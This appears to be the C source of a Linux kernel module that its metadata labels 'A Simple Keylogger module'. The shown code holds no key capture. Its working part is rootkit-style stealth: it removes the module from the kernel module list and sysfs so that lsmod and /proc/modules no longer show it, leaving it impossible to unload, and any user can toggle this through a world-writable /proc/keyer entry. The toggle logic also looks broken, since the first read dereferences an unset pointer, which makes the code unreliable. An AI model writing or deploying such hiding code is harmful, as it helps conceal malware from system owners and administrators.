#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/module.h>    
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/proc_fs.h>   
#include <linux/seq_file.h>  
static char module_hidden = 1;


static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static struct proc_dir_entry *keyer_entry;

void module_hide(void) 
{
	//Remove module entry from /sys/module which hides it in /proc/modules and lsmod
	//While it is hidden the module cannot be uninstalled.
	if (module_hidden) return;
	//remove from modules list
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	//remove kobjects and store just in case
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}

void module_show(void) 
{
	int result;
	if (!module_hidden) return;
	//readd module
	list_add(&THIS_MODULE->list, module_previous);
	//restoring kobject to it's original place and adding it to /sys/module
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "keyer");
	module_hidden = !module_hidden;
}
static int keyer_proc_show(struct seq_file *m, void *v) {
	
	if (module_hidden)
	{
		module_show();
		seq_printf(m, "Hidden status toggled: No longer hidden \n");
	}
	else if (!module_hidden)
	{
		module_hide();
		seq_printf(m, "Hidden status toggled: Hidden \n");
	}
	return 0;
}
static int keyer_proc_open(struct inode *inode, struct  file *file) {
	return single_open(file, keyer_proc_show, NULL);
}
static const struct file_operations proc_file_fops = {
	.owner = THIS_MODULE,
	.open  = keyer_proc_open,
	.read = seq_read,
	.llseek = seq_lseek,
	.release = single_release,
};

static int __init keyer_init(void)
{
	printk(KERN_INFO "Hello world!\n");
	keyer_entry = proc_create("keyer", 0666, NULL, &proc_file_fops);
	if (keyer_entry == NULL) return 0;
	
    
    return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit keyer_cleanup(void)
{
	remove_proc_entry("keyer", NULL);
	printk(KERN_INFO "Cleaning up module.\n");

}

module_init(keyer_init);
module_exit(keyer_cleanup);
MODULE_AUTHOR("faineance");
MODULE_DESCRIPTION("A Simple Keylogger module");
MODULE_LICENSE("GPL");
